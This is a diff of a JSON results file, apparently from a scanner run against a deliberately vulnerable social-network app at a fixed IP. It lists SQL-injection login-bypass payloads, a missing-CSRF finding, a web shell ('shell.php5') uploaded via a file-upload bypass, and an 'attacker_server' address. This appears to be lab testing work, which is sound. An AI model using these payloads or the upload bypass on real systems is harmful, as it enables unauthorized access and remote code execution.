@@ -1,29 +1,20 @@
 {
-  "sql_injection": [
-    {
-      "url": "http://18.179.53.107/vulnerable-sns/www/login.php",
-      "payload": {
-        "username": "admin' OR '1'='1",
-        "password": "anything"
-      },
-      "type": "authentication_bypass"
-    }
-  ],
-  "xss": [],
-  "csrf": [
-    {
-      "url": "http://18.179.53.107/vulnerable-sns/www/profile.php",
-      "form_action": null,
-      "method": "POST",
-      "reason": "No CSRF token"
-    }
-  ],
-  "lfi": [
-    {
-      "url": "http://18.179.53.107/vulnerable-sns/www/upload.php",
-      "filename": "shell.php5",
-      "uploaded_path": "http://18.179.53.107/vulnerable-sns/www/uploads/shell.php5",
-      "type": "file_upload_bypass_rce"
-    }
-  ]
+  "target": "http://18.179.53.107/vulnerable-sns/www",
+  "attacker_server": "http://13.158.67.78:5000",
+  "vulnerabilities": {
+    "sql_injection": [
+      {
+        "url": "http://18.179.53.107/vulnerable-sns/www/login.php",
+        "payload": {
+          "username": "admin\" OR \"1\"=\"1",
+          "password": "anything"
+        },
+        "type": "authentication_bypass"
+      }
+    ],
+    "xss": [],
+    "csrf": [],
+    "lfi": []
+  },
+  "total_found": 1
 }
